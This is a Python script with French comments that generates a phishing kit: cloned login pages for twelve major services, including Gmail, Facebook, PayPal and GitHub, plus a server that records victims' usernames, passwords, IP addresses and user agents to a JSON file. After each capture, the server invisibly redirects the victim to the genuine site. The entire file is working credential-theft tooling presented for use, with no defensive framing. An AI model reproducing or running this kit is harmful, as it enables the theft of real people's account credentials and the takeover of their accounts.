#!/usr/bin/env python3
# language: Python 3, file: trick_forge.py, target: macOS
# JEDI MIND TRICK - LA FORGE DE PHISHING : pages de connexion reelles des grands sites,
# capture des identifiants + IP/UA, puis redirection transparente vers le site veritable.
# Usage: python3 trick_forge.py <nom_du_site> [port]
# Sites live : gmail, outlook, facebook, instagram, twitter, linkedin, netflix, paypal, steam, github, snapchat, tiktok
import os, sys, json

KIT = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(KIT, "sorties", "trick")
os.makedirs(OUT, exist_ok=True)

site = (sys.argv[1] if len(sys.argv) > 1 else "gmail").lower()
port = sys.argv[2] if len(sys.argv) > 2 else "8085"

# chaque page : look reel clonne inline (aucune dep externe), POST /login -> capture -> redirect
SITES = {
    "gmail": {
        "title": "Gmail",
        "logo": "M",
        "logo_color": "#EA4335",
        "bg": "#f6f8fc",
        "box": "#fff",
        "text": "#202124",
        "btn": "#1a73e8",
        "btn_text": "#fff",
        "btn_label": "Suivant",
        "sub": "Utilisez votre compte Google",
        "placeholder1": "Adresse e-mail ou téléphone",
        "placeholder2": "Saisissez votre mot de passe",
        "redirect": "https://mail.google.com/",
        "label_title": "Connexion",
    },
    "outlook": {
        "title": "Se connecter à Outlook",
        "logo": "📧",
        "logo_color": "#0072c6",
        "bg": "#f3f2f1",
        "box": "#fff",
        "text": "#201f1e",
        "btn": "#0078d4",
        "btn_text": "#fff",
        "btn_label": "Se connecter",
        "sub": "Utilisez votre compte Microsoft",
        "placeholder1": "Adresse e-mail ou téléphone",
        "placeholder2": "Mot de passe",
        "redirect": "https://outlook.live.com/",
        "label_title": "Connexion",
    },
    "facebook": {
        "title": "Facebook — Connexion",
        "logo": "facebook",
        "logo_color": "#1877f2",
        "bg": "#f0f2f5",
        "box": "#fff",
        "text": "#1c1e21",
        "btn": "#1877f2",
        "btn_text": "#fff",
        "btn_label": "Se connecter",
        "sub": "Facebook vous aide à connecter et partager avec les personnes de votre vie.",
        "placeholder1": "Adresse e-mail ou numéro de tél.",
        "placeholder2": "Mot de passe",
        "redirect": "https://www.facebook.com/",
        "label_title": "Connexion",
    },
    "instagram": {
        "title": "Instagram",
        "logo": "Instagram",
        "logo_color": "#262626",
        "bg": "#fafafa",
        "box": "#fff",
        "text": "#262626",
        "btn": "#0095f6",
        "btn_text": "#fff",
        "btn_label": "Se connecter",
        "sub": "Connectez-vous pour voir les photos et vidéos de vos amis.",
        "placeholder1": "Téléphone, nom d'utilisateur ou e-mail",
        "placeholder2": "Mot de passe",
        "redirect": "https://www.instagram.com/",
        "label_title": "Connexion",
    },
    "twitter": {
        "title": "X — Connexion",
        "logo": "𝕏",
        "logo_color": "#0f1419",
        "bg": "#000",
        "box": "#16181c",
        "text": "#e7e9ea",
        "btn": "#1d9bf0",
        "btn_text": "#fff",
        "btn_label": "Se connecter",
        "sub": "Connectez-vous à X",
        "placeholder1": "Téléphone, e-mail ou nom d'utilisateur",
        "placeholder2": "Mot de passe",
        "redirect": "https://x.com/",
        "label_title": "Connexion",
    },
    "linkedin": {
        "title": "LinkedIn — Connexion",
        "logo": "Linked",
        "logo_color": "#0a66c2",
        "bg": "#f4f2ee",
        "box": "#fff",
        "text": "#000000e6",
        "btn": "#0a66c2",
        "btn_text": "#fff",
        "btn_label": "Se connecter",
        "sub": "Rester informé et prendre des décisions éclairées.",
        "placeholder1": "E-mail ou téléphone",
        "placeholder2": "Mot de passe",
        "redirect": "https://www.linkedin.com/feed/",
        "label_title": "Connexion",
    },
    "netflix": {
        "title": "Netflix",
        "logo": "NETFLIX",
        "logo_color": "#E50914",
        "bg": "#000",
        "box": "rgba(0,0,0,.75)",
        "text": "#fff",
        "btn": "#e50914",
        "btn_text": "#fff",
        "btn_label": "S'identifier",
        "sub": "Prêt à regarder Netflix ? Saisissez votre adresse e-mail.",
        "placeholder1": "Adresse e-mail",
        "placeholder2": "Mot de passe",
        "redirect": "https://www.netflix.com/browse",
        "label_title": "Connexion",
    },
    "paypal": {
        "title": "PayPal — Connexion",
        "logo": "PayPal",
        "logo_color": "#003087",
        "bg": "#f5f7fa",
        "box": "#fff",
        "text": "#2c2e2f",
        "btn": "#0070ba",
        "btn_text": "#fff",
        "btn_label": "Se connecter",
        "sub": "Accédez à votre compte PayPal",
        "placeholder1": "E-mail ou numéro de mobile",
        "placeholder2": "Mot de passe",
        "redirect": "https://www.paypal.com/myaccount/",
        "label_title": "Connexion",
    },
    "steam": {
        "title": "Steam — Connexion",
        "logo": "STEAM",
        "logo_color": "#66c0f4",
        "bg": "#1b2838",
        "box": "#171a21",
        "text": "#c6d4df",
        "btn": "#66c0f4",
        "btn_text": "#fff",
        "btn_label": "Se connecter",
        "sub": "Connectez-vous à votre compte Steam",
        "placeholder1": "Nom du compte",
        "placeholder2": "Mot de passe",
        "redirect": "https://store.steampowered.com/",
        "label_title": "Connexion",
    },
    "github": {
        "title": "GitHub — Connexion",
        "logo": "GitHub",
        "logo_color": "#24292f",
        "bg": "#f6f8fa",
        "box": "#fff",
        "text": "#24292f",
        "btn": "#2da44e",
        "btn_text": "#fff",
        "btn_label": "Se connecter",
        "sub": "Where the world builds software",
        "placeholder1": "Nom d'utilisateur ou e-mail",
        "placeholder2": "Mot de passe",
        "redirect": "https://github.com/",
        "label_title": "Connexion",
    },
    "snapchat": {
        "title": "Snapchat — Connexion",
        "logo": "👻",
        "logo_color": "#FFFC00",
        "bg": "#FFFC00",
        "box": "#fff",
        "text": "#16191c",
        "btn": "#0fadde",
        "btn_text": "#fff",
        "btn_label": "Se connecter",
        "sub": "Connectez-vous pour discuter avec vos amis",
        "placeholder1": "Nom d'utilisateur ou e-mail",
        "placeholder2": "Mot de passe",
        "redirect": "https://web.snapchat.com/",
        "label_title": "Connexion",
    },
    "tiktok": {
        "title": "TikTok — Connexion",
        "logo": "TikTok",
        "logo_color": "#fe2c55",
        "bg": "#000",
        "box": "#161823",
        "text": "#fff",
        "btn": "#fe2c55",
        "btn_text": "#fff",
        "btn_label": "Se connecter",
        "sub": "Gérez votre compte, consultez les notifications et les commentaires",
        "placeholder1": "E-mail ou nom d'utilisateur",
        "placeholder2": "Mot de passe",
        "redirect": "https://www.tiktok.com/",
        "label_title": "Connexion",
    },
}

if site not in SITES:
    print(f"sites disponibles : {', '.join(SITES)}")
    sys.exit(1)

cfg = SITES[site]
page = f"""<!doctype html><html lang="fr"><head><meta charset="utf-8">
<title>{cfg['title']}</title>
<style>
body{{margin:0;background:{cfg['bg']};color:{cfg['text']};font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif}}
.wrap{{display:grid;place-items:center;min-height:92vh}}
.box{{background:{cfg['box']};padding:44px 40px;border-radius:10px;width:330px;
box-shadow:0 2px 12px rgba(0,0,0,.08);text-align:center}}
.logo{{font-size:2em;font-weight:700;color:{cfg['logo_color']};margin-bottom:12px}}
.sub{{font-size:.92em;opacity:.75;margin-bottom:22px;line-height:1.4}}
input{{width:100%;box-sizing:border-box;padding:13px 12px;margin:6px 0;border:1px solid #ccc;
border-radius:6px;font-size:.95em;background:inherit;color:inherit}}
button{{width:100%;padding:13px;margin-top:14px;background:{cfg['btn']};color:{cfg['btn_text']};
border:0;border-radius:6px;font-size:1em;font-weight:600;cursor:pointer}}
button:hover{{filter:brightness(1.1)}}
.note{{font-size:.8em;opacity:.6;margin-top:16px}}
</style></head><body>
<div class="wrap"><form class="box" method="POST" action="/login">
  <div class="logo">{cfg['logo']}</div>
  <div class="sub">{cfg['sub']}</div>
  <input name="u" placeholder="{cfg['placeholder1']}" required autofocus>
  <input name="p" type="password" placeholder="{cfg['placeholder2']}" required>
  <button>{cfg['btn_label']}</button>
  <div class="note">Mot de passe oublié ? · Créer un compte</div>
</form></div></body></html>"""

server = f'''#!/usr/bin/env python3
# serveur de capture {site} - identifiants + IP + UA -> captures.json, puis redirection reelle
import http.server, urllib.parse, json, datetime, os

REDIRECT = "{cfg['redirect']}"
PAGE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "page.html")
CAPS = os.path.join(os.path.dirname(os.path.abspath(__file__)), "captures.json")

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/login":
            b = open(PAGE, "rb").read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(b)))
            self.end_headers(); self.wfile.write(b)
        else:
            self.send_response(302)
            self.send_header("Location", REDIRECT)
            self.end_headers()

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        data = urllib.parse.parse_qs(self.rfile.read(n).decode())
        entry = {{
            "heure": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "ip": self.client_address[0],
            "user_agent": self.headers.get("User-Agent", ""),
            "referer": self.headers.get("Referer", ""),
            "site": "{site}",
            "identifiant": data.get("u", [""])[0],
            "mot_de_passe": data.get("p", [""])[0],
        }}
        caps = json.load(open(CAPS)) if os.path.exists(CAPS) else []
        caps.append(entry)
        json.dump(caps, open(CAPS, "w"), ensure_ascii=False, indent=1)
        print(f"[CAPTURE] {{entry['heure']}} IP={{entry['ip']}} {{entry['identifiant']}} : {{entry['mot_de_passe']}}")
        self.send_response(302)
        self.send_header("Location", REDIRECT)
        self.end_headers()

    def log_message(self, *a): pass

http.server.HTTPServer(("0.0.0.0", {port}), H).serve_forever()
'''

d = os.path.join(OUT, site)
os.makedirs(d, exist_ok=True)
open(os.path.join(d, "page.html"), "w").write(page)
open(os.path.join(d, "serve.py"), "w").write(server)

print(f"[OK] kit {site} genere dans sorties/trick/{site}/")
print(f"     lancement : python3 sorties/trick/{site}/serve.py")
print(f"     page      : http://127.0.0.1:{port}/login")
print(f"     capture   : identifiants + IP + UA -> captures.json")
print(f"     puis redirection INVISIBLE vers {cfg['redirect']}")
print(f"[i] la victime ne voit RIEN : elle atterrit sur le vrai {site} comme si de rien n'etait")
